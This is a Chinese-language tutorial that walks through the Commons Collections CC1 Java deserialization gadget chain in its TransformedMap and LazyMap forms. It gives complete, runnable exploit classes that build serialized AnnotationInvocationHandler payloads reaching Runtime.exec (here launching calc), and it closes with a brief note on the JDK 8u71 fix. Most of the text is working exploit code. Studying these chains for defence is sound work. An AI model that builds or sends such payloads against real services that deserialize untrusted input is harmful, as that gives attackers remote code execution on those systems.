# Java反序列化之CC1

## TransformMap版CC1攻击链分析

首先明确反序列化的思路：

在入口类，我们需要一个`readObject`方法，在结尾需要一个能够命令执行的方法，中间我们通过链子引导。所以我们一般从尾部出发找入口。

### 尾部的 exec 方法

先查看一下`Transformer`这个接口，有一个`transform`方法。我们看一下这个接口有哪些实现类。最终我们在`InvokerTransformer`这个类里面发现它的`transform`方法存在反射调用任意类。

```java
public Object transform(Object input) {
	if (input == null) {
		return null;
	}
	try {
		Class cls = input.getClass();
		Method method = cls.getMethod(iMethodName, iParamTypes);
		return method.invoke(input, iArgs);
                
	} catch (NoSuchMethodException ex) {
		throw new FunctorException("InvokerTransformer: The method '" + iMethodName + 		"' on '" + input.getClass() + "' does not exist");
	} catch (IllegalAccessException ex) {
		throw new FunctorException("InvokerTransformer: The method '" + iMethodName + 		"' on '" + input.getClass() + "' cannot be accessed");
	} catch (InvocationTargetException ex) {
		throw new FunctorException("InvokerTransformer: The method '" + iMethodName + 		"' on '" + input.getClass() + "' threw an exception", ex);
	}
}
```

我们可以利用这个类实现弹计算器。

在`InvokerTransformer`这个类中有一个构造器：

```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
	super();
	iMethodName = methodName;
	iParamTypes = paramTypes;
	iArgs = args;
}
```

利用这个构造器实现：

```java
package org.example;

import org.apache.commons.collections.functors.InvokerTransformer;

import java.lang.reflect.Method;

public class InvokerTransformerTest {
    public static void main(String[] args) throws Exception{
        Runtime runtime = Runtime.getRuntime();
        InvokerTransformer exec = (InvokerTransformer) new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(runtime);
    }
}
```

### 初步寻找链子

由于`transform`方法可以实现任意类调用，我们就来找找哪些其他的类调用了`transform`方法。

我们可以发现在`TransformedMap`类中存在`checkSetValue()`方法调用了`transform`方法：

```java
protected Object checkSetValue(Object value) {
	return valueTransformer.transform(value);
}
```

接下来看看`valueTransformer`是个什么东西。

这是`TransformedMap`的一个属性，在其构造器中赋值：

```java
protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
	super(map);
	this.keyTransformer = keyTransformer;
	this.valueTransformer = valueTransformer;
}
```

而这个构造方法是受保护的，在外部无法调用，所以我们还需要找找谁调用了这个构造器。而在这个类的一个静态方法`decorate()`中就创建了一个这样的对象。

```java
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
	return new TransformedMap(map, keyTransformer, valueTransformer);
}
```

我们以这个类为入口来写一个 POC：

```java
package org.example;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class DecorateCalc {
    public static void main(String[] args) throws Exception{
        Runtime runtime = Runtime.getRuntime();
        InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        HashMap<Object, Object> map = new HashMap<>();
        Map transformedmap = TransformedMap.decorate(map, null, exec);
        Class<TransformedMap> transformedMapClass = TransformedMap.class;
        Method checkSetValue = transformedMapClass.getDeclaredMethod("checkSetValue", Object.class);
        checkSetValue.setAccessible(true);
        checkSetValue.invoke(transformedmap,runtime);
    }
}
```

这里从入口到结尾来理清思路：

1. `TransformedMap`类的静态方法`decorate`会 new 一个 TransformedMap 对象出来（因为这个类的构造器是受保护属性的，在外部无法直接访问）
2. `TransformedMap` 类有一个成员方法`checkSetValue`，这个方法会调用属性`valueTransformer`的`transform`方法，如果我们的`valueTransformer`属性是一个`InvokerTransformer`对象，我们就能触发这个对象的`transform`方法实现反射调用任意类。
3. 要想实现任意类调用，我们需要创建一个`InvokerTransformer`对象，让这个对象的`iMethodName`、`iParamTypes`和`iArgs`属性分别是`exec`、`String.class`、`"calc"`。
4. 最终我们要调用`checkSetValue`方法来隐式调用`transform`方法，这个方法是受保护的，我们利用反射来调用它，参数则是`checkSetValue`方法所在的类`TransformedMap`的对象和这个方法本身需要的参数`Object value`，结合`return valueTransformer.transform(value);`我们就能更容易理解。上面的`exec`是一个`InvokerTransformer`对象，也是`valueTransformer`属性的值，所以就会调用`InvokerTransformer`的`transform`方法。

### 完整链子

目前的链子位于`checkSetValue`，而`decorate`的链子已经无法更进一步，所以回到`checkSetValue`找链子。

查找用法后找到了`parent.checkSetValue`调用了`checkSetValue`，这是`TransformedMap`的父类`AbstractInputCheckedMapDecorator`的一个内部类`MapEntry`的一个方法：

```java
static class MapEntry extends AbstractMapEntryDecorator {

        /** The parent map */
        private final AbstractInputCheckedMapDecorator parent;

        protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {
            super(entry);
            this.parent = parent;
        }

        public Object setValue(Object value) {
            value = parent.checkSetValue(value);
            return entry.setValue(value);
        }
    }
```

这里`parent`是`AbstractInputCheckedMapDecorator`对象，这是一个抽象类，这个类的`checkSetValue`也是一个抽象方法，想要调用抽象类的抽象方法就必须由实现它的子类调用。而`TransformedMap`就是这个抽象类的子类，在这里让`parent`是`TransformedMap`对象就能实现调用。

这样我们就需要调用`MapEntry`的`setValue`，然后传入`Runtime`对象就能触发链子。

往前找什么地方调用了`setValue`或者一个重写`readObject`时调用了`setValue`方法的入口类。

能找到`sun.reflect.annotation.AnnotationInvocationHandler`这个类，这个类重写了`readObject`方法，内部还调用了`setValue`方法。

```java
private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();

        // Check to make sure that types have not evolved incompatibly

        AnnotationType annotationType = null;
        try {
            annotationType = AnnotationType.getInstance(type);
        } catch(IllegalArgumentException e) {
            // Class is no longer an annotation type; time to punch out
            throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map<String, Class<?>> memberTypes = annotationType.memberTypes();

        // If there are annotation members without values, that
        // situation is handled by the invoke method.
        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) {
                    memberValue.setValue(   //setValue触发
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
                }
            }
        }
    }
```

在 java 中，我们反序列化一个对象，即`ois.readObject(这个对象)`时，如果这个对象内部有`reradObject`方法，则会自动调用。

所以`AnnotationInvocationHandler`类在反序列化时，会遍历`memberValues`这一个 Map 对象的所有 entry（entry 就是键值对），因为`entrySet()`这个方法会把 Map 里所有的键值对都以`Map.Entry`对象的形式取出并放入一个`Set`中，然后对每一个 entry 调用`setValue`。

但是首先要`memberType`不为空，这就要`memberTypes`这个 Map 能通过 key 拿到值。而 `memberTypes` 来自 `annotationType.getMemberTypes()` —— 即注解本身定义的成员。

`Map<String, Class<?>> memberTypes = annotationType.memberTypes();`这里得到的 Map 的内容是：键为注解成员的名称，值为该成员的类型的 Class 对象。

**对于 `Retention.class`：**

`@Retention` 注解的定义里只有一个成员 `value`，类型是 `RetentionPolicy`。所以返回的 Map 里只有一个键值对：

| Key       | Value                   |
| :-------- | :---------------------- |
| `"value"` | `RetentionPolicy.class` |

```java
Map<String, Class<?>> memberTypes = annotationType.memberTypes();
// 对于 Retention.class，memberTypes 就是 {"value" → RetentionPolicy.class}

for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
    String name = memberValue.getKey();
    Class<?> memberType = memberTypes.get(name); // 用 "value" 去查
    
    if (memberType != null) {  // 查到了 RetentionPolicy.class，不为 null
        // 进入这里，最终触发 setValue
    }
}
```

第二个条件：

```java
if (!(memberType.isInstance(value) || value instanceof ExceptionProxy))
```

想要进入 if 内的语句，我们需要这两个表达式都是 false，`value`是从`Object value = memberValue.getValue();`这里得到的，我们输入的一般都不会是`ExceptionProxy`，所以是 false。

`memberType.isInstance(value)`是 false 则说明 value 不是 RetentionPolicy 类型，我们随便设置一个字符串即可。

这样我们就能调用到其中的`setValue`方法了。

## TransformMap版CC1 EXP

### 理想情况下

```java
package org.example;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Annotation;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class EXP {

    public static void serialize(Object obj) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws Exception{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws Exception{
        Runtime r = Runtime.getRuntime();
        InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        HashMap<Object, Object> map = new HashMap<>();
        map.put("value","abc");    
        Map transformedMap = TransformedMap.decorate(map, null, exec);
        
        Class<?> aih = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> aihConstructor = aih.getDeclaredConstructor(Class.class, Map.class);
        aihConstructor.setAccessible(true);
        Object o = aihConstructor.newInstance(Retention.class, transformedMap);

        serialize(o);
        unserialize("ser,bin");
    }
}
```

但是这样也有问题。首先，`Runtime` 对象不可序列化，需要通过反射将其变成可以序列化的形式。`setValue()` 的传参，是需要传 `Runtime` 对象的；而在实际情况当中的 `setValue()` 的传参并不是这个对象。

### Runtime 不能序列化的处理方法

`Runtime`不能序列化，但是`Class`对象可以序列化，我们可以利用反射来实现。

先来一个基本的反射调用：

```java
package org.example;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Annotation;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class EXP {

    public static void main(String[] args) throws Exception{

        Class<Runtime> r = Runtime.class;
        Method getRuntime = r.getDeclaredMethod("getRuntime");
        Runtime runtime = (Runtime) getRuntime.invoke(null, null);
        Method exec = r.getDeclaredMethod("exec", String.class);
        exec.invoke(runtime,"calc");

    }
}
```

再写成`InvokerTransformer`的调用形式：

```java
package org.example;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Annotation;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class EXP {

    public static void serialize(Object obj) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws Exception{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws Exception{

        Class<Runtime> r = Runtime.class;
        /*Class<Runtime> r = Runtime.class;
        Method getRuntime = r.getDeclaredMethod("getRuntime");
        Runtime runtime = (Runtime) getRuntime.invoke(null, null);
        Method exec = r.getDeclaredMethod("exec", String.class);
        exec.invoke(runtime,"calc");   */

        Method getRuntime = (Method) new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}).transform(r);

        Runtime run = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}).transform(getRuntime);

        Method exec = (Method) new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"exec", new Class[]{String.class}}).transform(r);

        new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class},new Object[]{run,new String[]{"calc"}}).transform(exec);

    }
}
```

这里代码重复度挺高的，可以使用`ChainedTransformer`这个类来提高代码复用性。

看一下`ChainedTransformer`的部分源码：

```java
private final Transformer[] iTransformers;

public ChainedTransformer(Transformer[] transformers) {
        super();
        iTransformers = transformers;
    }
```

```java
public Object transform(Object object) {
        for (int i = 0; i < iTransformers.length; i++) {
            object = iTransformers[i].transform(object);
        }
        return object;
    }
```

在调用`ChainedTransformer`的`transform`方法时会遍历传入的`transformers`，而前一个调用的结果是后一个调用的参数。

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class eztest {
    public static void main(String[] args) throws Exception{

        Transformer[] transformers=new Transformer[]{
                new InvokerTransformer("getDeclaredMethod",new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        chainedTransformer.transform(Runtime.class);
    }
}
```

到这 Runtime 的问题解决了，然后是 setValue 参数不可控的问题。

### setValue 参数不可控的解决办法

我们需要找一个类，能够控制 setValue 的参数。

这里找到`ConstantTransformer`，部分源码：

```java 
private final Object iConstant;

public ConstantTransformer(Object constantToReturn) {
        super();
        iConstant = constantToReturn;
    }

public Object transform(Object input) {
        return iConstant;
    }
```

这样就很明显了，如果我们 new 一个`ConstantTransformer`时传入 Runtime.class，不管`transform`传入说明传输都会返回 Runtime.class。

## 最终 EXP

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Annotation;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class EXP {

    public static void serialize(Object obj) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws Exception{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws Exception{

        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod",new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<>();
        map.put("value","abc");
        Map transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> aih = c.getDeclaredConstructor(Class.class, Map.class);
        aih.setAccessible(true);
        Object o = aih.newInstance(Retention.class, transformedMap);

        serialize(o);
        unserialize("ser.bin");

    }
}
```

先总结一下利用链：

```text
利用链：
InvokerTransformer#transform
    TransformedMap#checkSetValue
        AbstractInputCheckedMapDecorator#setValue
            AnnotationInvocationHandler#readObject
使用到的工具类辅助利用链：
ConstantTransformer
ChainedTransformer
HashMap
```

然后从入口类理清思路：

1. `AnnotationInvocationHandler`这个类重写了`readObject`方法，在反序列化的过程中会自动调用。这个类的构造器是包级私有，所有想要实例化这个类就需要使用反射调用，这个构造器的两个参数分别是**注解类型的 Class 对象和一个 Map 对象**。这个 Map 参数会传递给一个内部属性`memberValues`，在`readObject`方法中会遍历这个 Map，然后把这个 Map 的键值对取出来放到`Map.Entry`中。然后先获取键，如果这个注解类型的内部成员的名称与这个键相同且值不是空就会进入下一步，用`Retention.class`可以通过两层条件，进入`memberValue.setValue`调用`setValue`

2. 此时我们传一个`TransformedMap`对象，会对其调用`entrySet`方法，这个方法是由其父类`AbstractInputCheckedMapDecorator`定义的，看一下源码：

   ```java
   public Set entrySet() {
           if (isSetValueChecking()) {
               return new EntrySet(map.entrySet(), this);
           } else {
               return map.entrySet();
           }
       }
   ```

   这里会返回一个`EntrySet`实例，这是`AbstractInputCheckedMapDecorator`的一个内部类。这个类有一个方法`iterator()`，在 for-each 中会自动调用，所以会返回一个`EntrySetIterator`实例，在`EntrySetIterator`中有一个`next()`方法，这个方法也是在 for-each 中会自动调用，然后返回一个`MapEntry`实例，拿到这个实例之后赋值给`Map.Entry<String, Object> memberValue`，此时调用`memberValue`的`setValue`方法就会调用`MapEntry`的`setValue`方法，在这个`setValue`方法里就会调用`checkSetValue`方法。在上面的过程中，`return new EntrySet(map.entrySet(), this)`其中的`this`，也就是一开始的`transformedMap`，就被传递进去，最终传递到`value = parent.checkSetValue(value)`这里的`parent`，从而调用`TransformedMap`类的`checkSetValue`方法。

3. 我们创建一个`TransformedMap`对象的时候已经传入一个`ChainedTransformer`对象作为`valueTransformer`的值，所以会调用`valueTransformer`的`transform`方法。而`ChainedTransformer`的`transform`的内部会遍历里面元素并调用相应的`transform`方法，同时返回的值会作为下一次`transform`调用的参数。此时我们构造第一个参数是一个`ConstantTransformer`对象，参数是`Runtime.class`，这个类的`transform`方法会直接返回`Runtime.class`。

4. 然后通过在`ChainedTransformer`内部的链式调用，成功弹出计算器。

## LazyMap 版 CC1 攻击链分析

### 链尾的 exec

尾部依旧是`InvokeTransformer`，反射调用任意类。

查找用法后发现在`LazyMap`的`get`方法中找到了`transform`方法，且作用域是 public。

```java
public Object get(Object key) {
        // create value for key if key is not currently in the map
        if (map.containsKey(key) == false) {
            Object value = factory.transform(key);
            map.put(key, value);
            return value;
        }
        return map.get(key);
    }
```

### 寻找利用链

先找一下`factory`是什么。

```java
protected final Transformer factory;
```

同时还有`decorate`方法，会返回一个`LazyMap`。

同时这个类的构造器是`protected`属性，无法直接获取，所以需要使用`decorate`方法来获取`LazyMap`对象。

构造一个初步的 EXP：

```java
package org.example.lazyCC1;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.HashedMap;
import org.apache.commons.collections.map.LazyMap;

import java.util.Map;

public class LazyMapCC1Test {
    public static void main(String[] args) {

        Runtime runtime = Runtime.getRuntime();

        InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});

        HashedMap map = new HashedMap();

        Map lazyMap = LazyMap.decorate(map, exec);

        lazyMap.get(runtime);

    }
}
```

成功弹出计算器。然后去寻找谁调用了`LazyMap.get()`。然后就找到了`AnnotationInvocationHandler`的`invoke()`方法，其中调用了`get()`方法。

```java
public Object invoke(Object proxy, Method method, Object[] args) {
        String member = method.getName();
        Class<?>[] paramTypes = method.getParameterTypes();

        // Handle Object and Annotation methods
        if (member.equals("equals") && paramTypes.length == 1 &&
            paramTypes[0] == Object.class)
            return equalsImpl(args[0]);
        if (paramTypes.length != 0)
            throw new AssertionError("Too many parameters for an annotation method");

        switch(member) {
        case "toString":
            return toStringImpl();
        case "hashCode":
            return hashCodeImpl();
        case "annotationType":
            return type;
        }

        // Handle annotation member accessors
        Object result = memberValues.get(member);

        if (result == null)
            throw new IncompleteAnnotationException(type, member);

        if (result instanceof ExceptionProxy)
            throw ((ExceptionProxy) result).generateException();

        if (result.getClass().isArray() && Array.getLength(result) != 0)
            result = cloneArray(result);

        return result;
    }
```

这个类也很好，里面有`readObject()`方法，可以作为入口类。

关键在于触发`invoke()`。

## LazyMap 正版EXP

需要触发`invoke`方法，可以使用动态代理，一个类被动态代理后，想要通过代理调用这个类的方法，就一定会调用 `invoke()` 方法。

在上面`TransformedMap`版 CC1 中我们分析过，在`AnnotationInvocationHandler`中会调用`entrySet()`方法，所以如果我们把`memberValues`的值设置为代理对象，当调用代理对象的方法时就会跳到执行`invoke()`方法，最终完成链式调用。

```java
package org.example.lazyCC1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class LazyMapCC1Test {

    public static void serialize(Object obj) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws Exception{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws Exception{

        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod",new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, chainedTransformer);

        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> aih = c.getDeclaredConstructor(Class.class, Map.class);
        aih.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) aih.newInstance(Retention.class, lazyMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, invocationHandler);

        InvocationHandler o = (InvocationHandler) aih.newInstance(Retention.class, proxyMap);

        serialize(o);
        unserialize("ser.bin");
    }
}
```

这里从头到尾分析一下调用链：

1. 入口类`AnnotationInvocationHandler`重写了`readObject`方法，其中会调用`memberValues.entrySet()`，如果我们把`memberValues`设置为一个`Map`类型的代理对象时，调用这个代理对象的`entrySet()`方法时调用就会被拦截，并转发到我们自己定义的调用处理器的`invoke()`方法。而我们自定义的调用处理器就是一个`AnnotationInvocationHandler`对象，所以就会调用它的`invoke()`方法。
2. 我们带入我们的exp看一下，首先我们创建一个`AnnotationInvocationHandler`实例，这个对象内部是有`invoke`方法的，所以我们可以把它作为我们的调用处理器以便后续调用时会调用该`invoke`方法。然后我们构造一个`Map`类型的动态代理（以便能够调用`entrySet`方法）并传入这个调用处理器。然后我们再构造一个`AnnotationInvocationHandler`对象（用来反序列化的），把我们的代理传进去，这样在反序列化时就会调用这个代理的`entrySet`方法，然后转发到调用处理器的`invoke`方法中。
3. 调用到代理的`invoke`方法中就会触发**调用处理器`AnnotationInvocationHandler`对象**的`memberValues`的`get`方法，而此时我们把**调用处理器**中的`memberValues`设置为`LazyMap`对象，就会触发`LazyMap`的`get`方法。
4. 而`LazyMap`的`factory`我们已经设置为一个`ChainedTransformer`实例，就会调用这个`ChainedTransformer`的`transform`方法，从而实现链式调用，最终弹出计算器。

## 修复手法

官方的推荐修复是把 jdk 版本提升至 jdk8u71，因为对于 TransformerMap 版的 CC1 链子来说，jdk8u71 及以后的版本没有了能调用 ReadObject 中 `setValue()` 方法的地方。而在8u71之后的版本反序列化不再通过`defaultReadObject`方式，而是通过`readFields` 来获取几个特定的属性，`defaultReadObject` 可以恢复对象本身的类属性，比如`this.memberValues` 就能恢复成我们原本设置的恶意类，但通过`readFields`方式，`this.memberValues` 就为null，所以后续执行get()就必然没发触发，这也就是高版本不能使用的原因。































